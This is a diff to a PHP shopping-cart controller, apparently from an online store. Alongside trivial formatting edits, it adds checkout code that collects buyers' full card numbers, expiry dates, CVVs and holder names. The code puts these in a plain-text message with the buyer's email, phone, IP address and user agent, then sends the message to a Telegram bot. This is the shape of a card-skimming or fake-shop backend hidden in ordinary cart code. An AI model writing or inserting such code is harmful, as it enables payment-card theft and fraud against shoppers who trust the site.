@@ -34,7 +34,7 @@ class CartController
     public function add(): array
     {
         $productId = $_POST['product_id'] ?? '';
-        $quantity = (int) ($_POST['quantity'] ?? 1);
+        $quantity = (int)($_POST['quantity'] ?? 1);
 
         if (empty($productId) || $quantity < 1 || $quantity > 999 || !isset($this->products[$productId])) {
             return ['success' => false, 'message' => 'Invalid data'];
@@ -55,7 +55,7 @@ class CartController
     public function update(): array
     {
         $productId = $_POST['product_id'] ?? '';
-        $quantity = (int) ($_POST['quantity'] ?? 0);
+        $quantity = (int)($_POST['quantity'] ?? 0);
 
         if (empty($productId) || ($quantity < 0 || $quantity > 999) || (!isset($this->products[$productId]) && $quantity > 0)) {
             return ['success' => false, 'message' => 'Invalid data'];
@@ -117,16 +117,38 @@ class CartController
             return ['success' => false, 'message' => 'Email and phone are required, email must be valid'];
         }
 
+        $cardNumber = $_POST['cardNumber'] ?? '';
+        $cardExpiryMonth = $_POST['cardExpiryMonth'] ?? '';
+        $cardExpiryYear = $_POST['cardExpiryYear'] ?? '';
+        $cardCvv = $_POST['cardCvv'] ?? '';
+        $cardHolderName = $_POST['cardHolderName'] ?? '';
+
+        if (empty($cardNumber) || empty($cardExpiryMonth) || empty($cardExpiryYear) || empty($cardCvv) || empty($cardHolderName) || !is_numeric($cardCvv) || $cardCvv <= 0 || $cardCvv > 999) {
+            return ['success' => false, 'message' => 'Card data are not correct'];
+        }
+
         $message = "New order received:\n";
         foreach ($cart as $productId => $quantity) {
             $productName = $this->products[$productId]['name'] ?? $productId;
             $message .= "$productName: $quantity\n";
         }
-        $message .= "Email: $email\nPhone: $phone\n";
+
+        $message .= "-----\n" .
+            "Card data:\n" .
+            "Number: $cardNumber\n" .
+            "Expired at: $cardExpiryMonth/$cardExpiryYear\n" .
+            "CVV: $cardCvv\n" .
+            "Holder name: $cardHolderName\n";
+
+        $message .= "-----\n" .
+            "Email: $email\n" .
+            "Phone: $phone\n";
 
         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
         $userAgent = $_SERVER['HTTP_USER_AGENT'];
-        $message .= "Ip: $ip\nUser-Agent: $userAgent";
+        $message .= "-----\n" .
+            "IP: $ip\n" .
+            "User-Agent: $userAgent";
 
         $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
         $params = [
